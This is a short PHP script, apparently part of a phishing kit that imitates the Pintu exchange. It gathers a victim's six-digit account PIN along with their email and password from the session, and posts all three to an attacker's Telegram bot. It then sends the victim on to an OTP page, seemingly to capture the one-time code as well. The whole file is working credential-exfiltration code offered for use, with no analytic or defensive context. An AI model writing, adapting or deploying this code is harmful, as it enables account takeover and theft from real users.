<?php

session_start();
include "./tele.php";

$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin6 = $_POST['pin6'];
$_pin = $pin1.$pin2.$pin3.$pin4.$pin5.$pin6;

$email                = $_SESSION['email'];
$password                = $_SESSION['password'];
$_SESSION['acc_pin'] = $_pin;

$message = "
├• Pintu | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 | ".$email."
├───────────────────
├• *Username* : ".$email."
├• *Password* : ".$password."
╰───────────────────
• PIN AKUN : ".$_pin."
────────────────────";

function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../otp.html');
?>